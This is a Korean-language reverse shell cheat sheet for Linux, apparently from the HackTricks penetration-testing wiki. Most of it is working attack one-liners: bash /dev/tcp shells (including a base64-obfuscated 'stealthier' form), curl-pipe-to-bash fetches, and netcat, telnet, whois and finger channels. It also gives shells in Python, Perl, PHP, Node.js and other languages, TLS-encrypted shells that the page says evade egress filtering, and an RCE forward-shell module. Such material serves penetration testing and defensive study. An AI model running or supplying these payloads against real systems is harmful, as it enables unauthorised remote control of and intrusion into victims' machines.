# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**이러한 shell들에 대해 질문이 있으면** [**https://explainshell.com/**](https://explainshell.com) **에서 확인할 수 있습니다.**

## Full TTY

**reverse shell을 얻은 후** [ **full TTY를 얻기 위해 이 페이지를 읽으세요**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
다른 shells도 확인하는 것을 잊지 마세요: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, and bash.

### Symbol safe shell
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell 설명

1. **`bash -i`**: 이 부분은 명령어의 interactive (`-i`) Bash shell을 시작합니다.
2. **`>&`**: 이 부분은 **standard output** (`stdout`)과 **standard error** (`stderr`)를 **같은 대상**으로 **redirecting**하는 shorthand notation입니다.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 이것은 지정된 IP address와 port에 대한 TCP connection을 **represent하는 special file**입니다.
- **output**과 error streams를 이 파일로 **redirecting**하면, 명령어는 interactive shell session의 output을 attacker의 machine으로 효과적으로 보냅니다.
4. **`0>&1`**: 이 부분은 standard input (`stdin`)을 standard output (`stdout`)과 같은 대상로 **redirects**합니다.

### 파일에 생성하고 execute
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

Linux 기반 웹 애플리케이션에서 **Remote Code Execution (RCE)** 취약점을 다룰 때, reverse shell 획득은 iptables 규칙이나 복잡한 packet filtering 메커니즘 같은 네트워크 방어로 인해 차단될 수 있습니다. 이런 제한적인 환경에서는, 대신 PTY (Pseudo Terminal) shell을 설정하여 침해된 시스템과 더 효과적으로 상호작용하는 방법을 사용할 수 있습니다.

이 목적에 권장되는 도구는 [toboggan](https://github.com/n3rada/toboggan.git)이며, 이는 대상 환경과의 상호작용을 단순화합니다.

toboggan을 효과적으로 활용하려면, 대상 시스템의 RCE 상황에 맞게 조정된 Python module을 생성하세요. 예를 들어, `nix.py`라는 module은 다음과 같이 구성할 수 있습니다:
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
그리고 나서, 다음을 실행할 수 있습니다:
```shell
toboggan -m nix.py -i
```
직접 interractive shell을 활용하려면, Burpsuite 통합을 위해 `-b`를 추가하고, 더 기본적인 rce wrapper를 위해 `-i`를 제거할 수 있습니다.

또 다른 방법은 `IppSec` forward shell 구현 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)을 사용하는 것입니다.

다음만 수정하면 됩니다:

- vulnerable host의 URL
- payload의 prefix와 suffix(있는 경우)
- payload가 전송되는 방식(headers? data? extra info?)

그런 다음, **명령을 전송**하거나, 심지어 **`upgrade` 명령을 사용**해서 full PTY를 얻을 수 있습니다(참고로 pipes는 대략 1.3초 지연으로 읽고 쓰입니다).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## BusyBox

**라우터**, **임베디드 디바이스**, **컨테이너**, 그리고 최소 구성된 Linux 어플라이언스에서 매우 흔합니다. 독립적인 `nc`가 없다면, BusyBox가 이를 제공하는지 확인하세요:
```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```
If `busybox nc`가 존재하지만 interactive execution이 불안정하면, `nc` 섹션의 FIFO 패턴은 보통 여전히 작동합니다:
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)에서 확인하세요
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**공격자**
```bash
while true; do nc -l <port>; done
```
명령을 보내려면 입력하고, Enter를 누른 다음 CTRL+D를 누르십시오(STDIN을 중지하려면)

**Victim**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```
## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## Zsh (built-in TCP)
```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```
## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rust로 작성된 현대적인 netcat-like listener (2024년부터 Kali에 패키징됨).
```bash
# Attacker – interactive TLS listener with history & tab-completion
rcat listen -ib 55600

# Victim – download static binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
&& chmod +x /tmp/rcat \
&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```
Features:
- 암호화된 전송(TLS 1.3)을 위한 선택적 `--ssl` 플래그
- 피해자에서 임의의 바이너리(예: `/bin/sh`, `python3`)를 실행하는 `-s`
- 완전한 상호작용형 PTY로 자동 업그레이드하는 `--up`

## pwncat-cs

이미 **어떤 raw reverse shell**이든 가지고 있지만, 이를 더 사용하기 좋은 세션으로 자동 업그레이드하려는 리스너가 필요하다면, `pwncat-cs`는 일반적인 `nc -lvnp` 리스너의 좋은 현대적 대체재입니다.
```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```
또한 **encrypted** `ssl-bind` 및 `ssl-connect` 채널을 지원하므로, 전송 암호화가 필요할 때 `ncat --ssl` 또는 `socat OPENSSL:` payloads와 함께 사용할 수 있습니다.

## revsh (encrypted & pivot-ready)

`revsh`는 **encrypted Diffie-Hellman tunnel** 위에서 완전한 TTY를 제공하는 작은 C client/server이며, 선택적으로 **TUN/TAP** 인터페이스를 연결해 reverse VPN-like pivoting에 사용할 수 있습니다.
```bash
# Build (or grab a pre-compiled binary from the releases page)
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443 with a pinned certificate
revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem

# Victim – reverse shell over TLS to the attacker
./revsh <ATTACKER-IP>:443
```
유용한 플래그:
- `-b` : reverse 대신 bind-shell
- `-p socks5://127.0.0.1:9050` : TOR/HTTP/SOCKS를 통해 proxy
- `-t` : TUN 인터페이스 생성 (reverse VPN)

전체 세션이 encrypted되고 multiplexed되므로, plain-text `/dev/tcp` shell을 차단할 단순한 egress filtering을 종종 우회할 수 있습니다.

## OpenSSL

**단일 포트 encrypted reverse shell**은 보통 classic two-listener pattern보다 더 practical한데, `443`을 통해 proxy하기 더 쉽고 자동화도 더 간단하기 때문입니다.

The Attacker (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```
피해자
```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```
입력/출력 채널을 분리하고 싶을 때는 여전히 고전적인 **two-listener** 패턴을 사용할 수 있습니다:
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**공격자**
```bash
while true; do nc -l 79; done
```
명령을 보내려면 그것을 입력하고, Enter를 누른 다음 CTRL+D를 누르세요(STDIN을 중지하려면)

**Victim**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

이것은 포트 6001에서 당신의 시스템에 연결을 시도합니다:
```bash
xterm -display 10.0.0.1:1
```
reverse shell을 잡으려면 다음을 사용할 수 있습니다(이것은 port 6001에서 listen합니다):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell also work for Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## References

- [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
- [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)
- [https://gtfobins.org/gtfobins/busybox/](https://gtfobins.org/gtfobins/busybox/)

{{#include ../../banners/hacktricks-training.md}}
